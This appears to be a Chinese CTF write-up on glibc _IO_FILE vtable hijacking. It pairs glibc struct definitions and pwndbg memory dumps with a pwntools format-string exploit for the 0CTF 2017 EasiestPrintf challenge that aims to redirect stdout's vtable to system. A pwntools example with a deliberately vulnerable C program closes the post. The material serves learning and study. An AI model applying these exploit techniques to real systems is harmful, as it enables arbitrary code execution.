<p><code>glibc-2.24/libio/libio.h</code><br><figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">_IO_FILE_plus</span></span> _IO_2_1_stdin_;</div><div class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">_IO_FILE_plus</span></span> _IO_2_1_stdout_;</div><div class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">_IO_FILE_plus</span></span> _IO_2_1_stderr_;</div></pre></td></tr></table></figure></p>
<p>我们查看<code>_IO_FILE_plus</code>的结构体定义<br><code>/root/desktop/glibc-2.24/libio/libioP.h</code><br><figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></div><div class="line">   This contains a pointer to the function jump table used.</div><div class="line">   This is for compatibility with C++ streambuf; the word can</div><div class="line">   be used to smash to a pointer to a virtual function table. */</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">_IO_FILE_plus</span></span></div><div class="line">&#123;</div><div class="line">  _IO_FILE file;</div><div class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">_IO_jump_t</span></span> *vtable;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>这里也解释了之所以下面加上函数指针，做成类似虚表的形式，是为了与C++的流兼容。</p>
<p>下面来查看两个关键结构<code>_IO_FILE</code>和<code>_IO_jump_t</code>：<br><code>_IO_FILE</code>在<code>/usr/include/libio.h</code>中<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">struct <span class="variable">_IO_FILE</span> &#123;</div><div class="line">  int <span class="variable">_flags</span>;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></div><div class="line"></div><div class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></div><div class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></div><div class="line">  char* <span class="variable">_IO_read_ptr</span>;	<span class="comment">/* Current read pointer */</span></div><div class="line">  char* <span class="variable">_IO_read_end</span>;	<span class="comment">/* End of get area. */</span></div><div class="line">  char* <span class="variable">_IO_read_base</span>;	<span class="comment">/* Start of putback+get area. */</span></div><div class="line">  char* <span class="variable">_IO_write_base</span>;	<span class="comment">/* Start of put area. */</span></div><div class="line">  char* <span class="variable">_IO_write_ptr</span>;	<span class="comment">/* Current put pointer. */</span></div><div class="line">  char* <span class="variable">_IO_write_end</span>;	<span class="comment">/* End of put area. */</span></div><div class="line">  char* <span class="variable">_IO_buf_base</span>;	<span class="comment">/* Start of reserve area. */</span></div><div class="line">  char* <span class="variable">_IO_buf_end</span>;	<span class="comment">/* End of reserve area. */</span></div><div class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></div><div class="line">  char *<span class="variable">_IO_save_base</span>; <span class="comment">/* Pointer to start of non-current get area. */</span></div><div class="line">  char *<span class="variable">_IO_backup_base</span>;  <span class="comment">/* Pointer to first valid character of backup area */</span></div><div class="line">  char *<span class="variable">_IO_save_end</span>; <span class="comment">/* Pointer to end of non-current get area. */</span></div><div class="line"></div><div class="line">  struct <span class="variable">_IO_marker</span> *<span class="variable">_markers</span>;</div><div class="line"></div><div class="line">  struct <span class="variable">_IO_FILE</span> *<span class="variable">_chain</span>;</div><div class="line"></div><div class="line">  int <span class="variable">_fileno</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></div><div class="line">  int <span class="variable">_blksize</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">  int <span class="variable">_flags2</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">  <span class="variable">_IO_off_t</span> <span class="variable">_old_offset</span>; <span class="comment">/* This used to be _offset but it's too small.  */</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></div><div class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></div><div class="line">  unsigned short <span class="variable">_cur_column</span>;</div><div class="line">  signed char <span class="variable">_vtable_offset</span>;</div><div class="line">  char <span class="variable">_shortbuf</span>[<span class="number">1</span>];</div><div class="line"></div><div class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></div><div class="line"></div><div class="line">  <span class="variable">_IO_lock_t</span> *<span class="variable">_lock</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p><code>_IO_jump_t</code>在<code>/root/desktop/glibc-2.24/libio/fileops.c</code>中<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">const struct _IO_jump_t _IO_file_jumps libio_vtable =</div><div class="line">&#123;</div><div class="line">  <span class="keyword">JUMP_INIT_DUMMY,</span></div><div class="line">  <span class="keyword">JUMP_INIT(finish, </span>_IO_file_finish),</div><div class="line">  <span class="keyword">JUMP_INIT(overflow, </span>_IO_file_overflow),</div><div class="line">  <span class="keyword">JUMP_INIT(underflow, </span>_IO_file_underflow),</div><div class="line">  <span class="keyword">JUMP_INIT(uflow, </span>_IO_default_uflow),</div><div class="line">  <span class="keyword">JUMP_INIT(pbackfail, </span>_IO_default_pbackfail),</div><div class="line">  <span class="keyword">JUMP_INIT(xsputn, </span>_IO_file_xsputn),</div><div class="line">  <span class="keyword">JUMP_INIT(xsgetn, </span>_IO_file_xsgetn),</div><div class="line">  <span class="keyword">JUMP_INIT(seekoff, </span>_IO_new_file_seekoff),</div><div class="line">  <span class="keyword">JUMP_INIT(seekpos, </span>_IO_default_seekpos),</div><div class="line">  <span class="keyword">JUMP_INIT(setbuf, </span>_IO_new_file_setbuf),</div><div class="line">  <span class="keyword">JUMP_INIT(sync, </span>_IO_new_file_sync),</div><div class="line">  <span class="keyword">JUMP_INIT(doallocate, </span>_IO_file_doallocate),</div><div class="line">  <span class="keyword">JUMP_INIT(read, </span>_IO_file_read),</div><div class="line">  <span class="keyword">JUMP_INIT(write, </span>_IO_new_file_write),</div><div class="line">  <span class="keyword">JUMP_INIT(seek, </span>_IO_file_seek),</div><div class="line">  <span class="keyword">JUMP_INIT(close, </span>_IO_file_close),</div><div class="line">  <span class="keyword">JUMP_INIT(stat, </span>_IO_file_stat),</div><div class="line">  <span class="keyword">JUMP_INIT(showmanyc, </span>_IO_default_showmanyc),</div><div class="line">  <span class="keyword">JUMP_INIT(imbue, </span>_IO_default_imbue)</div><div class="line">&#125;<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>再结合gdb查看内存能够得到更直观的理解：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">wndbg&gt; telescope <span class="number">0xf771fd60</span> <span class="number">40</span></div><div class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf771fd60</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></div><div class="line"><span class="number">01</span>:<span class="number">0004</span>│   <span class="number">0xf771fd64</span> (_IO_2_1_stdout_+<span class="number">4</span>) —▸ <span class="number">0xf771fda7</span> (_IO_2_1_stdout_+<span class="number">71</span>) ◂— <span class="number">0x7208700a</span></div><div class="line">... ↓</div><div class="line"><span class="number">08</span>:<span class="number">0020</span>│   <span class="number">0xf771fd80</span> (_IO_2_1_stdout_+<span class="number">32</span>) —▸ <span class="number">0xf771fda8</span> (_IO_2_1_stdout_+<span class="number">72</span>) —▸ <span class="number">0xf7720870</span> ◂— <span class="number">0x0</span></div><div class="line"><span class="number">09</span>:<span class="number">0024</span>│   <span class="number">0xf771fd84</span> (_IO_2_1_stdout_+<span class="number">36</span>) ◂— <span class="number">0x0</span></div><div class="line">... ↓</div><div class="line"><span class="number">0d</span>:<span class="number">0034</span>│   <span class="number">0xf771fd94</span> (_IO_2_1_stdout_+<span class="number">52</span>) —▸ <span class="number">0xf771f5a0</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></div><div class="line">0e:<span class="number">0038</span>│   <span class="number">0xf771fd98</span> (_IO_2_1_stdout_+<span class="number">56</span>) ◂— <span class="number">0x1</span></div><div class="line">0f:003c│   <span class="number">0xf771fd9c</span> (_IO_2_1_stdout_+<span class="number">60</span>) ◂— <span class="number">0x0</span></div><div class="line"><span class="number">10</span>:<span class="number">0040</span>│   <span class="number">0xf771fda0</span> (_IO_2_1_stdout_+<span class="number">64</span>) ◂— <span class="number">0xffffffff</span></div><div class="line"><span class="number">11</span>:<span class="number">0044</span>│   <span class="number">0xf771fda4</span> (_IO_2_1_stdout_+<span class="number">68</span>) ◂— <span class="number">0xa000000</span></div><div class="line"><span class="number">12</span>:<span class="number">0048</span>│   <span class="number">0xf771fda8</span> (_IO_2_1_stdout_+<span class="number">72</span>) —▸ <span class="number">0xf7720870</span> ◂— <span class="number">0x0</span></div><div class="line"><span class="number">13</span>:004c│   <span class="number">0xf771fdac</span> (_IO_2_1_stdout_+<span class="number">76</span>) ◂— <span class="number">0xffffffff</span></div><div class="line">... ↓</div><div class="line"><span class="number">15</span>:<span class="number">0054</span>│   <span class="number">0xf771fdb4</span> (_IO_2_1_stdout_+<span class="number">84</span>) ◂— <span class="number">0x0</span></div><div class="line"><span class="number">16</span>:<span class="number">0058</span>│   <span class="number">0xf771fdb8</span> (_IO_2_1_stdout_+<span class="number">88</span>) —▸ <span class="number">0xf771f4e0</span> ◂— <span class="number">0x0</span></div><div class="line"><span class="number">17</span>:005c│   <span class="number">0xf771fdbc</span> (_IO_2_1_stdout_+<span class="number">92</span>) ◂— <span class="number">0x0</span></div><div class="line">... ↓</div><div class="line">1a:<span class="number">0068</span>│   <span class="number">0xf771fdc8</span> (_IO_2_1_stdout_+<span class="number">104</span>) ◂— <span class="number">0xffffffff</span></div><div class="line"><span class="number">1b</span>:006c│   <span class="number">0xf771fdcc</span> (_IO_2_1_stdout_+<span class="number">108</span>) ◂— <span class="number">0x0</span></div><div class="line">... ↓</div><div class="line"><span class="number">25</span>:<span class="number">0094</span>│   <span class="number">0xf771fdf4</span> (_IO_2_1_stdout_+<span class="number">148</span>) —▸ <span class="number">0xf771d960</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></div><div class="line"><span class="number">26</span>:<span class="number">0098</span>│   <span class="number">0xf771fdf8</span> (stderr) —▸ <span class="number">0xf771fcc0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2087</span></div><div class="line"><span class="number">27</span>:009c│   <span class="number">0xf771fdfc</span> (stdout) —▸ <span class="number">0xf771fd60</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></div><div class="line">pwndbg&gt; telescope <span class="number">0xf771d960</span> <span class="number">30</span></div><div class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf771d960</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></div><div class="line">... ↓</div><div class="line"><span class="number">02</span>:<span class="number">0008</span>│   <span class="number">0xf771d968</span> (_IO_file_jumps+<span class="number">8</span>) —▸ <span class="number">0xf75d6040</span> (_IO_file_finish) ◂— <span class="keyword">push</span>   <span class="built_in">edi</span></div><div class="line"><span class="number">03</span>:000c│   <span class="number">0xf771d96c</span> (_IO_file_jumps+<span class="number">12</span>) —▸ <span class="number">0xf75d6b00</span> (_IO_file_overflow) ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line"><span class="number">04</span>:<span class="number">0010</span>│   <span class="number">0xf771d970</span> (_IO_file_jumps+<span class="number">16</span>) —▸ <span class="number">0xf75d6810</span> (_IO_file_underflow) ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line"><span class="number">05</span>:<span class="number">0014</span>│   <span class="number">0xf771d974</span> (_IO_file_jumps+<span class="number">20</span>) —▸ <span class="number">0xf75d7a40</span> (_IO_default_uflow) ◂— <span class="keyword">push</span>   <span class="built_in">esi</span></div><div class="line"><span class="number">06</span>:<span class="number">0018</span>│   <span class="number">0xf771d978</span> (_IO_file_jumps+<span class="number">24</span>) —▸ <span class="number">0xf75d8b50</span> (_IO_default_pbackfail) ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line"><span class="number">07</span>:001c│   <span class="number">0xf771d97c</span> (_IO_file_jumps+<span class="number">28</span>) —▸ <span class="number">0xf75d5c50</span> (_IO_file_xsputn) ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line"><span class="number">08</span>:<span class="number">0020</span>│   <span class="number">0xf771d980</span> (_IO_file_jumps+<span class="number">32</span>) —▸ <span class="number">0xf75d5790</span> ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line"><span class="number">09</span>:<span class="number">0024</span>│   <span class="number">0xf771d984</span> (_IO_file_jumps+<span class="number">36</span>) —▸ <span class="number">0xf75d4730</span> (_IO_file_seekoff) ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line">0a:<span class="number">0028</span>│   <span class="number">0xf771d988</span> (_IO_file_jumps+<span class="number">40</span>) —▸ <span class="number">0xf75d7dd0</span> ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line"><span class="number">0b</span>:002c│   <span class="number">0xf771d98c</span> (_IO_file_jumps+<span class="number">44</span>) —▸ <span class="number">0xf75d44b0</span> (_IO_file_setbuf) ◂— <span class="keyword">push</span>   <span class="built_in">esi</span></div><div class="line">0c:<span class="number">0030</span>│   <span class="number">0xf771d990</span> (_IO_file_jumps+<span class="number">48</span>) —▸ <span class="number">0xf75d4300</span> (_IO_file_sync) ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line"><span class="number">0d</span>:<span class="number">0034</span>│   <span class="number">0xf771d994</span> (_IO_file_jumps+<span class="number">52</span>) —▸ <span class="number">0xf75c93b0</span> (_IO_file_doallocate) ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line">0e:<span class="number">0038</span>│   <span class="number">0xf771d998</span> (_IO_file_jumps+<span class="number">56</span>) —▸ <span class="number">0xf75d5c00</span> (_IO_file_read) ◂— <span class="keyword">push</span>   <span class="built_in">esi</span></div><div class="line">0f:003c│   <span class="number">0xf771d99c</span> (_IO_file_jumps+<span class="number">60</span>) —▸ <span class="number">0xf75d55b0</span> (_IO_file_write) ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line"><span class="number">10</span>:<span class="number">0040</span>│   <span class="number">0xf771d9a0</span> (_IO_file_jumps+<span class="number">64</span>) —▸ <span class="number">0xf75d5210</span> (_IO_file_seek) ◂— <span class="keyword">push</span>   <span class="built_in">ebx</span></div><div class="line"><span class="number">11</span>:<span class="number">0044</span>│   <span class="number">0xf771d9a4</span> (_IO_file_jumps+<span class="number">68</span>) —▸ <span class="number">0xf75d4480</span> (_IO_file_close) ◂— <span class="keyword">push</span>   <span class="built_in">ebx</span></div><div class="line"><span class="number">12</span>:<span class="number">0048</span>│   <span class="number">0xf771d9a8</span> (_IO_file_jumps+<span class="number">72</span>) —▸ <span class="number">0xf75d5590</span> (_IO_file_stat) ◂— <span class="keyword">sub</span>    <span class="built_in">esp</span>, <span class="number">0x10</span></div><div class="line"><span class="number">13</span>:004c│   <span class="number">0xf771d9ac</span> (_IO_file_jumps+<span class="number">76</span>) —▸ <span class="number">0xf75d8ce0</span> ◂— <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0xffffffff</span></div><div class="line"><span class="number">14</span>:<span class="number">0050</span>│   <span class="number">0xf771d9b0</span> (_IO_file_jumps+<span class="number">80</span>) —▸ <span class="number">0xf75d8cf0</span> ◂— <span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>我们平时调用文件族的函数的时候（包括一些输入输出），最后都会通过虚表来调用函数，如果我们可以通过修改<code>signed char _vtable_offset</code>使其指向一个我们伪造的虚表，那么我们就可以控制eip。</p>
<p>利用思路：</p>
<ol>
<li>控制<code>_IO_FILE_plus</code>或<code>_IO_FILE</code>结构体的<code>signed char _vtable_offset</code>偏移使其指向我们伪造的虚表。</li>
<li>伪造虚表中函数为我们希望程序调用的函数如<code>system</code></li>
</ol>
<p>利用条件：</p>
<ol>
<li>可泄露<code>libc</code>基址</li>
<li>有一次任意地址写的机会</li>
<li>存在一个我们知道地址的可控区域</li>
</ol>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>下面用20170ctf的Easyprintf来为例分析</p>
<blockquote>
<p>程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接exit。在程序启用Full RELRO的情况下，选择覆盖libc中的<code>_IO_2_1_stdout_</code>结构的虚表，因为<code>printf</code>在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为<code>system</code>，而这个结构自身会作为参数传入，覆盖虚表之后将一个<code>sh\0\0</code>写到整个结构头部即可。</p>
</blockquote>
<p>先放上没什么卵用但是应该是对的并且学到了东西的exp。。。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line">local = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">global</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> local:</div><div class="line">    p = process(<span class="string">'./EasiestPrintf'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote()</div><div class="line"></div><div class="line"><span class="keyword">if</span> local <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, open(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./EasiestPrintf'</span>)</div><div class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</div><div class="line">bss_addr = elf.bss</div><div class="line">_IO_stdout_got = <span class="number">0x0804A044</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">def exe_fmt(payload):</div><div class="line">    p = process('./EasiestPrintf')</div><div class="line">    p.recvuntil('read:\n')</div><div class="line">    p.sendline(str(_IO_stdout_addr))</div><div class="line">    p.recvuntil('Good Bye\n')</div><div class="line">    p.sendline(payload)</div><div class="line">    return p.recvall()</div><div class="line">'''</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'read:\n'</span>)</div><div class="line">    p.sendline(str(_IO_stdout_got))</div><div class="line">    _IO_stdout_addr = int(p.recvline(), <span class="number">16</span>)</div><div class="line">    p.recvline(<span class="string">'Good Bye\n'</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">'_IO_stdout_addr =&gt; '</span>, hex(_IO_stdout_addr)</div><div class="line">    libc.address = _IO_stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</div><div class="line">    system_addr = libc.symbols[<span class="string">'system'</span>]</div><div class="line">    <span class="keyword">print</span> <span class="string">'system_addr =&gt; '</span>, hex(system_addr)</div><div class="line">    _IO_file_jumps_addr = libc.symbols[<span class="string">'_IO_file_jumps'</span>]</div><div class="line">    <span class="keyword">print</span> <span class="string">'_IO_file_jumps =&gt; '</span>, hex(libc.symbols[<span class="string">'_IO_file_jumps'</span>])</div><div class="line"><span class="comment">#    gdb.attach(p, open('debug'))</span></div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exe_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">        p = process(<span class="string">'./EasiestPrintf'</span>)</div><div class="line">        p.recvuntil(<span class="string">'read:\n'</span>)</div><div class="line">        p.sendline(str(_IO_stdout_got))</div><div class="line">        p.recvuntil(<span class="string">'Good Bye\n'</span>)</div><div class="line">        p.sendline(payload)</div><div class="line">        <span class="keyword">return</span> p.recvall()</div><div class="line">    fmt = FmtStr(exe_fmt)  <span class="comment"># init</span></div><div class="line">    <span class="comment"># _IO_stdout_addr = 'sh\x00\x00'</span></div><div class="line">    <span class="comment"># _IO_stdout_addr - 4 = &amp;system</span></div><div class="line">    <span class="comment"># _IO_stdout_vtable+0x1c = &amp;(libc_stdout-4)       _IO_file_xsputn</span></div><div class="line">    writes = &#123;_IO_stdout_addr:<span class="number">26739</span><span class="number">-16</span>, <span class="comment"># 'sh\x00\x00'</span></div><div class="line">            _IO_stdout_addr<span class="number">-4</span>:system_addr,</div><div class="line">            _IO_file_jumps_addr+<span class="number">0x1c</span>:_IO_stdout_addr<span class="number">-4</span>&#125;</div><div class="line">    payload = fmtstr_payload(fmt.offset, writes, <span class="number">0</span>, <span class="string">'byte'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure></p>
<p>最后的payload使180长度，但是最大长度是158- -。。</p>
<h2 id="关于FmtStr"><a href="#关于FmtStr" class="headerlink" title="关于FmtStr"></a>关于FmtStr</h2><p>pwntools中的fmtstr还是很有趣的，唯一的不足就是生成的payload太长了- -因为据观察完全是用<code>hhn</code>来修改的（因为只能指定一个只能为<code>hhn</code>or<code>hn</code>or<code>n</code>中的一种来生成payload），大概是作者懒了没想设计别的算法把- -</p>
<p>先看下给出的example<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>program = tempfile.mktemp()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>source  = program + <span class="string">".c"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>write(source, <span class="string">'''</span></div><div class="line"><span class="meta">... </span>#include &lt;stdio.h&gt;</div><div class="line"><span class="meta">... </span>#include &lt;stdlib.h&gt;</div><div class="line"><span class="meta">... </span>#include &lt;unistd.h&gt;</div><div class="line"><span class="meta">... </span>#include &lt;sys/mman.h&gt;</div><div class="line"><span class="meta">... </span>#define MEMORY_ADDRESS ((void*)0x11111000)</div><div class="line"><span class="meta">... </span>#define MEMORY_SIZE 1024</div><div class="line"><span class="meta">... </span>#define TARGET ((int *) 0x11111110)</div><div class="line"><span class="meta">... </span>int main(int argc, char const *argv[])</div><div class="line"><span class="meta">... </span>&#123;</div><div class="line"><span class="meta">... </span>       char buff[1024];</div><div class="line"><span class="meta">... </span>       void *ptr = NULL;</div><div class="line"><span class="meta">... </span>       int *my_var = TARGET;</div><div class="line"><span class="meta">... </span>       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);</div><div class="line"><span class="meta">... </span>       if(ptr != MEMORY_ADDRESS)</div><div class="line"><span class="meta">... </span>       &#123;</div><div class="line"><span class="meta">... </span>               perror("mmap");</div><div class="line"><span class="meta">... </span>               return EXIT_FAILURE;</div><div class="line"><span class="meta">... </span>       &#125;</div><div class="line"><span class="meta">... </span>       *my_var = 0x41414141;</div><div class="line"><span class="meta">... </span>       write(1, &amp;my_var, sizeof(int *));</div><div class="line"><span class="meta">... </span>       scanf("%s", buff);</div><div class="line"><span class="meta">... </span>       dprintf(2, buff);</div><div class="line"><span class="meta">... </span>       write(1, my_var, sizeof(int));</div><div class="line"><span class="meta">... </span>       return 0;</div><div class="line"><span class="meta">... </span>&#125;''')</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>cmdline = [<span class="string">"gcc"</span>, source, <span class="string">"-Wno-format-security"</span>, <span class="string">"-m32"</span>, <span class="string">"-o"</span>, program]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>process(cmdline).wait_for_close()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line"><span class="meta">... </span>    p = process(program)</div><div class="line"><span class="meta">... </span>    p.sendline(payload)</div><div class="line"><span class="meta">... </span>    <span class="keyword">return</span> p.recvall()</div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>autofmt = FmtStr(exec_fmt)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>offset = autofmt.offset</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>p = process(program, stderr=PIPE)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>addr = unpack(p.recv(<span class="number">4</span>))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fmtstr_payload(offset, &#123;addr: <span class="number">0x1337babe</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>p.sendline(payload)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(unpack(p.recv(<span class="number">4</span>)))</div><div class="line"><span class="number">0x1337babe</span></div></pre></td></tr></table></figure></p>
